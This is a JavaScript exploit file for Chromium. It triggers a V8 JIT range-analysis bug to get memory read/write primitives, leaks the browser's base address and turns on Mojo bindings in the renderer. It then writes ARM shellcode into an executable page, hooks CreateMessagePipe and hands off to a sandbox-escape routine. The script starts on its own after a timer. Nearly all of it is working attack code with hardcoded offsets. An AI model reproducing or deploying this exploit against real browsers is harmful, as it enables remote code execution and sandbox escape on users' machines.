if (typeof(alert) == "undefined") alert = console.log;
// if (typeof(alert) != "undefined") print = new Function();

function gc() {
    for (let i = 0; i < 0x10000; i++) {
        new String();
    }
}
Number.prototype.hex = function() {
    return '0x' + this.toString(16);
};
function hex(n) {
    return '0x' + n.toString(16);
}

// ----------------------------------
let o, evil_ta, arb_ta;
let patch_chrome;
function arb_mem(addr) {
    evil_ta[45] = addr
}
function addrof(obj) {
    o.a = obj;
    return evil_ta[18] - 1;
}
function arb_read(addr) {
    arb_mem(addr);
    return arb_ta[0];
}
function arb_write(addr, val) {
    arb_mem(addr);
    arb_ta[0] = val;
}

function exploit() {
    function foo(a) {
        var y = 0x7fffffff;

        if (a == NaN) y = NaN;
        if (a) y = -1;

        let z = y + 1 + 0;
        let l = 0 - Math.sign(z);

        // real value: 1, optimizer: Range(-1, 0)
        let arr = new Array(l);
        arr.shift();

        return arr;
    }

    for (let i = 0; i < 0x10000; i++)
        foo(true);
    gc();gc();gc();gc();
    let arr = foo(false)
    evil_ta = new Uint32Array(4);
    o = new Object();
    o.a = 0x1234/2;
    arb_ta = new Uint32Array(0x1000);
    arr[25] = 0x100;
    arr[26] = 0x100;
    // %DebugPrint(arb_ta);

    let self_addr = addrof(o);
    let heap_addr = arb_read((self_addr & 0xfffc0000) + 0x20);
    let leak_addr = arb_read(heap_addr);
    // alert(leak_addr.hex());
    const kPageSize = 0x30fc000;
    const kLeakOffset = 0x9207c;
    let chromium_base_addr = leak_addr - kLeakOffset - kPageSize;
    if (window.Mojo === undefined) {
        // print("[INFO] Start v8 exploit");
        // alert(chromium_base_addr.hex());
        function enable_mojo() {
            const kFrameMapOffset = 0x383B560;
            const kRoutingIdFrameMapOffset = kFrameMapOffset - 0x10;
            let g_routing_id_frame_map = chromium_base_addr + kRoutingIdFrameMapOffset;
            // alert(g_routing_id_frame_map.hex());
            let g_routing_id_frame_map_item = arb_read(g_routing_id_frame_map + 4);
            // alert(g_routing_id_frame_map_item.hex());
            if (arb_read(g_routing_id_frame_map_item + 8) != g_routing_id_frame_map + 8) {
                alert("Not match! Failure!");
                throw "Not match";
            }
            let render_frame_impl = arb_read(g_routing_id_frame_map_item + 0x14);
            let enable_mojo_js_bindings_ = render_frame_impl + 0x2f0;
            arb_write(enable_mojo_js_bindings_, arb_read(enable_mojo_js_bindings_) | 1);
        }

        enable_mojo();
        arr[25] = 0;
        arr[26] = 0;
        location.reload();
    } else {
        print("[INFO] Mojo Enabled");
        function Module() {
            "use asm"
            function f1() {}
            return {f1: f1}
        }
        let evil_func = Module().f1;
        evil_func();
        let func_addr = addrof(evil_func);
        let shared_info_addr = arb_read(func_addr + 12) - 1;
        let rwx_addr = arb_read(shared_info_addr - 0x8c);
        // alert(rwx_addr.hex());

        const kMprotectOffset = 0x1AB365C + 1;
        const kMmapOffset = 0x1AB3380 + 1;
        function set_rwx_page() {
            let shellcode = [0xe92d4080, 0xe28f7040, 0xe4970004, 0xe4971004, 0xe3a02007, 0xe497c004, 0xe12fff3c, 0xe3a00000, 0xe2400001, 0xe3a01000, 0xe92d0003, 0xe3a03022, 0xe3a02007, 0xe3a01801, 0xe3a00801, 0xe497c004, 0xe12fff3c, 0xe8bd0003, 0xe8bd8080];

            let args = [
                chromium_base_addr,
                kPageSize,
                chromium_base_addr + kMprotectOffset,
                chromium_base_addr + kMmapOffset,
            ]
            shellcode.push(...args);
            for (let i = 0; i < shellcode.length; i++) {
                arb_write(rwx_addr + i * 4, shellcode[i]);
            }
            // alert(rwx_addr.hex());
            evil_func();
        }

        const code_seg_addr = 0x10000;
        const data_seg_addr = 0x18000;
        const kCreateMessagePipeOffset = 0x10a6604;
        function hook_create_message_pipe() {
            // prepare shellcode on 0x10000
            // save $port to 0x18000
            let shellcode = [0xe28f0034, 0xe5900000, 0xe3091806, 0xe0c010b2, 0xe3a01b1a, 0xe0c010b2, 0xe309194c, 0xe0c010b2, 0xe59d1050, 0xe3a00906, 0xe5801000, 0xe28fc008, 0xe59cc000, 0xe28cc001, 0xe12fff1c];

            let args = [
                chromium_base_addr + kCreateMessagePipeOffset
            ]
            shellcode.push(...args);
            for (let i = 0; i < shellcode.length; i++) {
                arb_write(code_seg_addr + i * 4, shellcode[i]);
            }
        }

        function prepare_patch_chrome() {
            // patch mojo::core::Core::CreateMessagePipe
            let shellcode = [0xe28f001c, 0xe5900000, 0xe30f144f, 0xe0c010b2, 0xe3a01df2, 0xe0c010b2, 0xe3041760, 0xe0c010b2, 0xe12fff1e];

            let args = [
                chromium_base_addr + kCreateMessagePipeOffset
            ]
            shellcode.push(...args);
            for (let i = 0; i < shellcode.length; i++) {
                arb_write(rwx_addr + i * 4, shellcode[i]);
            }
            patch_chrome = evil_func;
        }

        set_rwx_page();
        hook_create_message_pipe();
        prepare_patch_chrome();
        sandbox_exploit();
    }
}
// alert('start');
setTimeout(exploit, 3000);
